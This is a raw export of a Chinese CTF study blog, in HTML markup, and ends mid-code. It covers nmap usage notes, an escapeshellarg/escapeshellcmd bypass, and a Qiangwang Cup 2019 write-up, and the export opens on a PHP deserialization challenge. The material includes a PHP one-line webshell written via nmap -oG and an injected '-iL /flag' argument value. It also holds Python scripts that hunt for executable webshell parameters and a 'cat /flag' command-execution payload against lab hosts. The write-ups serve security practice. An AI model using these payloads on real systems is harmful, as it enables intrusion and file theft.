-oN <span class="hljs-tag">&lt;<span class="hljs-name">输出文件</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">目标IP</span>&gt;</span>`：将扫描结果以普通文本格式保存到文件中</span><br><span class="language-xml"></span><br><span class="language-xml">nmap </span><span class="language-php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);&gt; -oG shell.php将一句话木马写入到文件中</span><br></code></pre></td></tr></table></figure><p><strong>nmap：</strong></p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bnf">Nmap（Network Mapper）是一款功能强大的网络扫描工具，它能够帮助用户发现网络上的设备、开放的端口以及运行的服务。以下是一些Nmap的常见命令及其用途：<br><br>基本扫描<br>nmap <span class="hljs-attribute">&lt;目标IP&gt;</span>：对指定IP地址进行快速扫描，默认扫描100个常用端口。<br>nmap -p <span class="hljs-attribute">&lt;端口范围&gt;</span> <span class="hljs-attribute">&lt;目标IP&gt;</span>：扫描指定IP地址的特定端口范围。<br>详细扫描<br>nmap -sV <span class="hljs-attribute">&lt;目标IP&gt;</span>：探测目标主机上运行的服务的版本信息。<br>nmap -O <span class="hljs-attribute">&lt;目标IP&gt;</span>：尝试检测目标主机的操作系统类型。<br>nmap -A <span class="hljs-attribute">&lt;目标IP&gt;</span>：进行高级扫描，包括操作系统检测、版本检测、脚本扫描等。<br>扫描多个目标<br>nmap <span class="hljs-attribute">&lt;目标IP1&gt;</span> <span class="hljs-attribute">&lt;目标IP2&gt;</span> ...：依次扫描多个IP地址。<br>nmap -iL <span class="hljs-attribute">&lt;目标文件&gt;</span>：从文件中读取IP地址列表进行扫描。<br>扫描整个子网<br>nmap <span class="hljs-attribute">&lt;起始IP&gt;</span>-<span class="hljs-attribute">&lt;结束IP&gt;</span>：扫描指定IP范围内的所有主机。<br>nmap <span class="hljs-attribute">&lt;网络地址&gt;</span>/<span class="hljs-attribute">&lt;子网掩码&gt;</span>：使用CIDR表示法扫描整个子网。<br>服务探测<br>nmap --script=<span class="hljs-attribute">&lt;脚本名&gt;</span> <span class="hljs-attribute">&lt;目标IP&gt;</span>：运行指定的Nmap脚本进行扫描。<br>nmap -sT <span class="hljs-attribute">&lt;目标IP&gt;</span>（或-sU）：进行TCP（或UDP）连接扫描。<br>nmap -sS <span class="hljs-attribute">&lt;目标IP&gt;</span>：进行TCP SYN扫描（半开扫描），速度较快且不易被防火墙发现。<br>性能优化<br>nmap -T<span class="hljs-attribute">&lt;0-5&gt;</span> <span class="hljs-attribute">&lt;目标IP&gt;</span>：设置扫描的并行度，-T0为最慢但最隐蔽，-T5为最快但可能触发防火墙警报。<br>nmap --min-hostgroup=<span class="hljs-attribute">&lt;数量&gt;</span>：设置一次扫描的主机组大小，以优化扫描速度。<br>结果输出<br>nmap -oN <span class="hljs-attribute">&lt;输出文件&gt;</span> <span class="hljs-attribute">&lt;目标IP&gt;</span>：将扫描结果以普通文本格式保存到文件中。<br>nmap -oX <span class="hljs-attribute">&lt;输出文件&gt;</span> <span class="hljs-attribute">&lt;目标IP&gt;</span>：将扫描结果以XML格式保存到文件中。<br>nmap -oG <span class="hljs-attribute">&lt;输出文件&gt;</span> <span class="hljs-attribute">&lt;目标IP&gt;</span>：将扫描结果以Grepable格式保存到文件中，便于后续处理。<br>其他选项<br>nmap --open <span class="hljs-attribute">&lt;目标IP&gt;</span>：仅显示开放的端口。<br>nmap --host-timeout=<span class="hljs-attribute">&lt;时间&gt;</span>：设置扫描每个主机的超时时间。<br>nmap --script-timeout=<span class="hljs-attribute">&lt;时间&gt;</span>：设置运行脚本的超时时间。<br>nmap --osscan-limit：限制操作系统检测，以加快扫描速度。<br>nmap --osscan-guess：尝试猜测更具体的操作系统信息。<br></code></pre></td></tr></table></figure><hr><h3 id="escapeshellarg和escapeshellcmd函数的绕过"><a href="#escapeshellarg和escapeshellcmd函数的绕过" class="headerlink" title="escapeshellarg和escapeshellcmd函数的绕过"></a>escapeshellarg和escapeshellcmd函数的绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">escapeshellarg()<br>escapeshellarg() 函数用于确保一个字符串在作为命令行参数时安全。它会将单引号进行转义，并用一对单引号包裹整个字符串，确保该字符串被视为一个单独的参数。<br><br>原始输入：<br><br><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;127.0.0.1&#x27; -iL /flag -o wtj&quot;</span>;<br>经过 escapeshellarg() 处理后：<br><br><span class="hljs-variable">$safe_input</span> = escapeshellarg(<span class="hljs-variable">$input</span>);  <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$safe_input</span>;  // 输出：<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\&#x27;<span class="hljs-string">&#x27; -iL /flag -o wtj&#x27;</span><br>解释：<br><br>单引号 <span class="hljs-string">&#x27; 被转义为 \&#x27;</span>，然后用一对单引号包裹整个字符串。<br>结果是一个合法的命令行参数，其中原始字符串被安全地引用。<br>escapeshellcmd()<br>escapeshellcmd() 函数用于确保一个字符串在作为整个命令行时安全。它会转义一些特殊字符，比如 ;, &amp;, (, ), |, &lt;, &gt;, ^, `, $, *, \, <span class="hljs-string">&quot;, `, [, ], &#123;, &#125;, =, ?, 和 #，以及空格和制表符。</span><br><span class="hljs-string"></span><br><span class="hljs-string">原始输入：</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-variable">$input</span> = &quot;</span><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\&#x27;<span class="hljs-string">&#x27; -iL /flag -o wtj&#x27;</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string"> 注意：这里输入已经包含了一些转义的单引号，并且整个字符串被单引号包裹。</span><br><span class="hljs-string"></span><br><span class="hljs-string">经过 escapeshellcmd() 处理后：</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-variable">$safe_input</span> = escapeshellcmd(<span class="hljs-variable">$input</span>);  </span><br><span class="hljs-string">echo <span class="hljs-variable">$safe_input</span>;  // 输出：&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -iL /flag -o wtj\&#x27;</span><br><span class="hljs-string">解释：</span><br><span class="hljs-string"></span><br><span class="hljs-string">单引号 &#x27; 已经被转义为 \&#x27;，但由于整个字符串已经处于单引号内，所以内部的 \&#x27; 被进一步转义为 \\&#x27;。</span><br><span class="hljs-string">字符串末尾的单引号 &#x27; 被转义为 \&#x27;，因为 escapeshellcmd() 会处理字符串中的所有特殊字符。</span><br><span class="hljs-string">结果是一个更安全的命令行字符串，但需要注意的是，这种处理方式可能会在某些情况下导致意外的行为，特别是当输入字符串已经包含转义字符时。 </span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> nmap </tag>
            
            <tag> escapeshellarg和escapeshellcmd函数的绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019-高明的黑客1</title>
      <link href="/2025/03/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21/"/>
      <url>/2025/03/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯2019-高明的黑客1"><a href="#强网杯2019-高明的黑客1" class="headerlink" title="强网杯2019-高明的黑客1"></a>强网杯2019-高明的黑客1</h1><p>首先启动靶机并访问。</p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21-1.png"></p><p>让我们下载<a href="http://www.tar.gz/">www.tar.gz</a></p><p>我们直接下载</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>cb4c879-<span class="hljs-number">874</span>a-<span class="hljs-number">4136</span>-b065-d72be226271a.node5.buuoj.cn:<span class="hljs-number">81</span>/www.tar.gz<br></code></pre></td></tr></table></figure><p>下载下来发现有很多的webshell，但是我们要找到可以利用的webshell，手动一个个查看很难，所以要使用脚本</p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21-2.png"></p><p>python脚本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">import re<br>import os<br>import requests<br><br>files = os.listdir(<span class="hljs-string">r&#x27;E:\CTF\phpstudy\phpstudy_pro\WWW\src&#x27;</span>)    <span class="hljs-comment">#获取路径下的所有文件</span><br>reg = re.compile(<span class="hljs-string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)   <span class="hljs-comment">#设置正则</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:                <span class="hljs-comment">#从第一个文件开始</span><br>    url = <span class="hljs-string">&quot;http://7f89144b-0ea3-4778-a8a2-253794458c23.node4.buuoj.cn:81/&quot;</span> + i<br>    f = open(<span class="hljs-string">r&quot;E:\CTF\phpstudy\phpstudy_pro\WWW\src/&quot;</span>+i,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>)       <span class="hljs-comment">#打开这个文件</span><br>    data = f.read()           <span class="hljs-comment">#读取文件内容</span><br>    f.close()                 <span class="hljs-comment">#关闭文件</span><br>    result = reg.findall(data)  <span class="hljs-comment">#从文件中找到GET请求</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> result:           <span class="hljs-comment">#从第一个GET参数开始</span><br>        payload = url + <span class="hljs-string">&quot;?&quot;</span> + j + <span class="hljs-string">&quot;=echo 123456&quot;</span>   <span class="hljs-comment">##尝试请求次路径，并执行命令</span><br>        print(payload)     <span class="hljs-comment">#输出payload</span><br>        html = requests.get(payload)  <span class="hljs-comment">#获取返回内容</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            print(<span class="hljs-string">&quot;就是它了！：&quot;</span>)    <span class="hljs-comment">#判断返回内容有123456的及可以利用</span><br>            print(payload)<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br>            <br>            <br></code></pre></td></tr></table></figure><p>或者</p><p>这个快一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(<span class="hljs-number">100</span>)                                            <span class="hljs-comment">#这儿设置最大的线程数</span><br>filePath = <span class="hljs-string">r&quot;D:/phpstudy_pro/WWW/src&quot;</span>                   <span class="hljs-comment">#自己替换为文件所在目录</span><br>os.chdir(filePath)                                                    <span class="hljs-comment">#改变当前的路径</span><br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>                                <span class="hljs-comment">#设置重连次数，防止线程数过高，断开连接</span><br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class="hljs-literal">False</span>                                             <span class="hljs-comment"># 设置连接活跃状态为False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()                                                <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:                            <span class="hljs-comment">#打开php文件，提取所有的$_GET和$_POST的参数</span><br>            gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>            posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;                                                        <span class="hljs-comment">#所有的$_POST</span><br>    params = &#123;&#125;                                                        <span class="hljs-comment">#所有的$_GET</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://127.0.0.1/src/&#x27;</span>+file                      <span class="hljs-comment">#自己替换为本地url</span><br>    req = session.post(url, data=data, params=params)            <span class="hljs-comment">#一次性请求所有的GET和POST</span><br>    req.close()                                                <span class="hljs-comment"># 关闭请求  释放内存</span><br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment">#print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:                                    <span class="hljs-comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span><br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()                                                <span class="hljs-comment"># 关闭请求  释放内存</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()                                                <span class="hljs-comment"># 关闭请求  释放内存</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:                                                    <span class="hljs-comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="hljs-string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:                                                            <span class="hljs-comment">#加入多线程</span><br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()<br></code></pre></td></tr></table></figure><p>成功查到可以利用的webshell和参数</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">xk0SzyKwfzw.php?Efa5BVG=<br></code></pre></td></tr></table></figure><hr><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>cb4c879-<span class="hljs-number">874</span>a-<span class="hljs-number">4136</span>-b065-d72be226271a.node5.buuoj.cn:<span class="hljs-number">81</span>/xk0SzyKwfzw.php?Efa5BVG=cat%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> python脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2019-easy_serialize_php1</title>
      <link href="/2025/03/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-serialize-php1/"/>
      <url>/2025/03/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-serialize-php1/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯2019-easy-serialize-php1"><a href="#安洵杯2019-easy-serialize-php1" class="headerlink" title="安洵杯2019-easy_serialize_php1"></a>安洵杯2019-easy_serialize_php1</h1><p>首先启动靶机并访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><hr><p><strong>先进行代码审计</strong></p><p><strong>filter 这个function 可以看作一个过滤器，具体内容为首先定义了一个$filter_arr数组,数组的内容为：’php’,’flag’,’php5’,’php4’,’fl1g’，又定义了一个$filter的字符串，格式是为了迎合下面的preg_replease()函数,意思就是如果匹配到$filter_arr数组中的内容则将其转换为空，且由于i的缘故，不区分大小写.</strong>  </p><p><strong><code>if($_SESSION)&#123;unset($_SESSION);&#125;意思是如果存在$_SESSION这个变量,则将其销毁</code></strong> </p><p> <strong>extract()覆盖函数，会把我们传入的键和值变成变量的值。</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$my_array</span> = array(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>,<span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>)<span class="hljs-comment">;</span><br>extract(<span class="hljs-variable">$my_array</span>)<span class="hljs-comment">;</span><br>echo <span class="hljs-string">&quot;\<span class="hljs-variable">$a</span> = <span class="hljs-variable">$a</span>; \<span class="hljs-variable">$b</span> = <span class="hljs-variable">$b</span>; \<span class="hljs-variable">$c</span> = <span class="hljs-variable">$c</span>&quot;</span><span class="hljs-comment">;</span><br><br><span class="hljs-comment">#$a = Cat;$b = Dog;$c = Horse</span><br></code></pre></td></tr></table></figure><hr><p>我们可以看到一个<code>//maybe you can find something in here!</code>提示，所以我们尝试查看一下他的php配置信息，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://f4389e4c-fed1-<span class="hljs-number">4425</span>-<span class="hljs-number">8200</span>-b716de45d06e.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php?f=phpinfo<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy_serialize_php1-1.png"></p><p>的确发现了一个好东西<code>d0g3_f1ag.php</code>，flag可能就存在这里面</p><p>由题目可以得知当$funcition的值为”show_image”时，会文件包含，这时只要我们使base64_decode解码后的$userinfo[‘img’]为d0g3_f1ag.php即可，那么base64_decode()中的内容需要为ZDBnM19mMWFnLnBocA&#x3D;&#x3D;</p><p>那么$userinfo()的内容中存在img&#x3D;&gt;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;的键值对,那么$serialzie_info则需要存在img&#x3D;&gt;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;的键值对的序列化内容,所以session中要存在img&#x3D;&gt;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;的键值对.</p><hr><p>继续分析发现</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">extract($_POST)<span class="hljs-comment">;</span><br><span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    $_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>)<span class="hljs-comment">;</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="hljs-string">&#x27;img_path&#x27;</span>]))<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里如果我们通过extract传入img的值，会被覆盖掉</p><p>但是这里有个</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">function</span><span class="hljs-built_in"> filter</span>(<span class="hljs-variable">$img</span>)&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span 